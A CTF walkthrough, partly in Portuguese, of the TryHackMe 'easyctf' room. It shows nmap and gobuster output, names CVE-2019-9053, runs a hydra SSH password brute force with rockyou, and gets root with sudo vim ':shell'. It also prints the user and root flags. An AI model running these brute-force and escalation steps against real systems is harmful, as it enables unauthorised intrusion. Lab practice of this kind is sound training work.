# TASK
https://tryhackme.com/room/easyctf

## How many services are running under port 1000?

nmap -T4 10.65.189.20 

└─$ nmap -T4 10.65.189.20                                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 15:45 -0400
Nmap scan report for 10.65.189.20 (10.65.189.20)
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

## What is running on the higher port?

map -sV -sC -p2222 10.65.189.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 15:52 -0400
Nmap scan report for 10.65.189.20 (10.65.189.20)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.03 seconds


ssh


## What's the CVE you're using against the application?

└─$ nmap -sV -sC -p80 10.65.189.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 15:57 -0400
Nmap scan report for 10.65.189.20 (10.65.189.20)
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds


foi realizado o gobuster
└─$ gobuster dir -u http://10.65.189.20 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.189.20
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 291]
.hta.php             (Status: 403) [Size: 295]
.hta.txt             (Status: 403) [Size: 295]
.htaccess            (Status: 403) [Size: 296]
.hta.html            (Status: 403) [Size: 296]
.htaccess.php        (Status: 403) [Size: 300]
.htaccess.html       (Status: 403) [Size: 301]
.htaccess.txt        (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 296]
.htpasswd.html       (Status: 403) [Size: 301]
.htpasswd.php        (Status: 403) [Size: 300]
.htpasswd.txt        (Status: 403) [Size: 300]
index.html           (Status: 200) [Size: 11321]
index.html           (Status: 200) [Size: 11321]
robots.txt           (Status: 200) [Size: 929]
robots.txt           (Status: 200) [Size: 929]
server-status        (Status: 403) [Size: 300]
simple               (Status: 301) [Size: 313] [--> http://10.65.189.20/simple/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

CMS Made Simple  pode usar conforme dica do tryhackme acesso não autorizado sql iva       CVE-2019-9053                                        

## To what kind of vulnerability is the application vulnerable?

injeção de sql

SQLi

## Como descobrir o user

fazer like até conseguir reconstruir o nome de usuário

## Where can you login with the details obtained?

uar a chave e senha do usuário mitch

ssh

## Descobrir a senha

hgydra

hydra -l mitch -P /usr/share/wordlists/rockyou.txt  -s 2222 ssh://10.65.189.20
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-28 16:29:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.65.189.20:2222/
[2222][ssh] host: 10.65.189.20   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-28 16:30:06


## logar no ssh


ssh -p 2222 mitch@10.65.189.20


## What's the user flag?

$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!

## Is there any other user in the home directory? What's its name?

sunbath

$ ls -latr /home
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 oct 28 22:18 mitch

## What can you leverage to spawn a privileged shell?



$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 

vim

## What's the root flag?

sudo vim

esc
:shell

$ whoami
mitch
$ ^[[A      : not found
$ ^C/sh: 2: 
$ vim
$ sudo vim

root@Machine:~# whoami
root
root@Machine:~# cd /var/root
bash: cd: /var/root: No such file or directory
root@Machine:~# ls -latr /
total 104
drwxr-xr-x   2 root root  4096 feb 27  2019 opt
drwxr-xr-x   2 root root  4096 feb 27  2019 mnt
drwxr-xr-x   2 root root  4096 feb 27  2019 media
drwxr-xr-x  11 root root  4096 feb 27  2019 usr
drwx------   2 root root 16384 aug 17  2019 lost+found
lrwxrwxrwx   1 root root    33 aug 17  2019 initrd.img.old -> boot/initrd.img-4.15.0-45-generic
drwxrwxr-x   2 root root  4096 aug 17  2019 cdrom
drwxr-xr-x  22 root root  4096 aug 17  2019 lib
drwxr-xr-x   2 root root  4096 aug 17  2019 snap
drwxr-xr-x   2 root root  4096 aug 17  2019 bin
drwxr-xr-x   2 root root 12288 aug 17  2019 sbin
drwxr-xr-x   3 root root  4096 aug 17  2019 srv
drwxr-xr-x  16 root root  4096 aug 17  2019 var
drwxr-xr-x   4 root root  4096 aug 17  2019 home
drwx------   4 root root  4096 aug 17  2019 root
lrwxrwxrwx   1 root root    30 aug 19  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-45-generic
lrwxrwxrwx   1 root root    30 aug 19  2019 vmlinuz -> boot/vmlinuz-4.15.0-58-generic
lrwxrwxrwx   1 root root    33 aug 19  2019 initrd.img -> boot/initrd.img-4.15.0-58-generic
drwxr-xr-x  23 root root  4096 aug 19  2019 ..
drwxr-xr-x  23 root root  4096 aug 19  2019 .
drwxr-xr-x   3 root root  4096 aug 19  2019 boot
drwxr-xr-x 134 root root 12288 aug 19  2019 etc
dr-xr-xr-x 138 root root     0 oct 28 21:43 proc
dr-xr-xr-x  13 root root     0 oct 28 21:43 sys
drwxr-xr-x  17 root root  3720 oct 28 21:43 dev
drwxr-xr-x  27 root root   900 oct 28 22:32 run
drwxrwxrwt  10 root root  4096 oct 28 22:35 tmp
root@Machine:~# cd root
bash: cd: root: No such file or directory
root@Machine:~# cd /root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt 
W3ll d0n3. You made it!
root@Machine:/root# 

W3ll d0n3. You made it!